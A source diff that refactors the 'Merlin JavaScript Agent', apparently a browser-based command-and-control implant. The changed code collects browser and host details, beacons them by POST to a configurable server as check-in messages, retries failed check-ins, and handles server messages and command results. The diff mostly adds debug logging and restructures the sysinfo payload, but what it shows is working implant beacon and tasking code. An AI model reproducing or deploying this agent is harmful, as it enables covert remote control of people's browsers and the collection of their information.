@@ -20,7 +20,7 @@ var debug = false;
 var verbose = true;
 var initial = true;
 var hostUUID = guid();
-var version = "1.0";
+var version = "0.0.0";
 var build = "nonRelease";
 var waitTime = 30000; // in milliseconds
 var maxRetry = 7;
@@ -45,32 +45,44 @@ function s4() {
         .substring(1);
 }
 
+// Base Message
 var b = {
     "version": version,
     "id": hostUUID,
     "type": null,
-    "padding": "RandomDataGoesHere", // Not implemented yet
+    "padding": "RandomDataGoesHere", // TODO Not implemented yet
     "payload": null
 };
 
-function initialCheckIn (){
+// SysInfo Message
+var s = {
+    "platform": navigator.platform,
+    "architecture": navigator.appCodeName,
+    "username": navigator.userAgent,
+    "userguid": navigator.appVersion,
+    "hostname": document.title
+};
 
+function initialCheckIn (){
     if (debug){console.log("[DEBUG]Entering into initialCheckIn function")}
     var x = new XMLHttpRequest();
-    var p = {
-        "platform": navigator.platform,
-        "architecture": navigator.appCodeName,
-        "username": navigator.userAgent,
-        "userguid": navigator.appVersion,
-        "hostname": document.title
+    var a = {
+        "version": version,
+        "build": build,
+        "waittime": (waitTime.toString())+ "ms", // TODO fix hard coding the duration to milliseconds with ms
+        "paddingmax": paddingMax,
+        "maxretry": maxRetry,
+        "failedcheckin": failedCheckin,
+        // "skew": "", TODO implement skew
+        "proto": "h2",
+        "sysinfo": s
     };
     b.type = "InitialCheckIn";
-    b.payload = p;
+    b.payload = a;
     if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for initial check in.")}
     x.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             initial = false;
-            agentInfo();
             failedCheckin = 0;
         }
     };
@@ -80,7 +92,15 @@ function initialCheckIn (){
     x.onerror = function(e) {
         failedCheckin++;
         verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins")
+        if (debug){
+            console.log("[DEBUG]initialCheckIn POST request error:")
+            console.log(e)
+        }
     };
+    if (debug){
+        console.log("[DEBUG]Sending initialCheckIn XHR payload:")
+        console.log(b)
+    }
     x.send(JSON.stringify(b));
 }
 
@@ -90,10 +110,12 @@ function agentInfo (){
     var a = {
         "version": version,
         "build": build,
-        "waittime": waitTime.toString(),
+        "waittime": (waitTime.toString())+ "ms", // TODO fix hard coding the duration to milliseconds with ms
         "paddingmax": paddingMax,
         "maxretry": maxRetry,
-        "failedcheckin": failedCheckin
+        "failedcheckin": failedCheckin,
+        "proto": "h2",
+        "sysinfo": s
     };
     b.type = "AgentInfo";
     b.payload = a;
@@ -106,7 +128,10 @@ function agentInfo (){
     };
     x.open('POST', url, true);
     x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
-    if (debug){console.log("[DEBUG]Sending AgentInfo XHR")}
+    if (debug){
+        console.log("[DEBUG]Sending AgentInfo XHR:");
+        console.log(b);
+    }
     x.send(JSON.stringify(b));
 }
 
@@ -153,6 +178,7 @@ function cmdResults(job, stdOut, stdErr){
 }
 
 function verboseMessage(type, message){
+    if (debug){console.log("[DEBUG]Entering into verboseMessage function")}
     if (verbose && log != null){
         switch (type){
             case "success":
@@ -173,6 +199,7 @@ function verboseMessage(type, message){
 }
 
 function processJSON(type, json){
+    if (debug){console.log("[DEBUG]Entering into processJSON function")}
     verboseMessage("success", type + " message type received!");
     switch (type){
         case "ServerOk":
@@ -279,12 +306,12 @@ function main(){
         today.toLocaleString("en-US", options))}
 }
 
-// Check for overide URL
+// Check for override URL
 if (typeof oURL == 'string'){url=oURL}
 
 if (verbose){
     verboseMessage("success", "Starting Merlin JavaScript Agent");
-    verboseMessage("note", "Agent version:" + version);
+    verboseMessage("note", "Agent version: " + version);
     verboseMessage("note", "Agent build: " + build);
     verboseMessage("note", "Agent UUID: " + hostUUID);
     verboseMessage("note", "Platform: " + navigator.appCodeName);
